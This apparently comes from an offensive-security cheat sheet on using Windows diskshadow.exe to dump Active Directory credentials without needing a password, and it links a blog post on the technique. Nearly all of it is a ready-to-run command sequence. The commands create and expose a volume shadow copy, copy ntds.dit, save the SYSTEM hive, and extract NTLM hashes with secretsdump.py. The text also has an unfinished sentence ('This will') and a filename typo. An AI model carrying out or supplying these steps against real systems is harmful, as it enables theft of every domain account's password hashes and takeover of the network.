# Diskshadow - No credential required

Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS). By default, Diskshadow uses an interactive command interpreter similar to that of Diskraid or Diskpart. Diskshadow also includes a scriptable mode.&#x20;

{% embed url="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" %}

This will&#x20;

{% code overflow="wrap" %}
```bash
# Path 
# C:\Windows\System32\diskshadow.exe
# C:\Windows\SysWOW64\diskshadow.exe

CMD>diskshadow.exe

diskshadow>set context persistent nowriters 
diskshadow>set metadata c:\temp\metadata.cab
diskshadow>add volume c: alias someAlias
diskshadow>create
diskshadow> expose %someAlias% z:
diskshadow> exit

CMD> mkdir c:\temp
CMD> cmd.exe /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit

CMD>diskshadow.exe

diskshadow>delete shadows volume someAlias
diskshadow>reset
diskshadow>exit

CMD> reg.exe save hklm\system c:\Temp\system.bak

Kali> secretsdump.py -ntds ntds.dit -system system.bak LOCAL
Kali> secretsdump.py -ntds ntds.dit -system system.back -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```
{% endcode %}

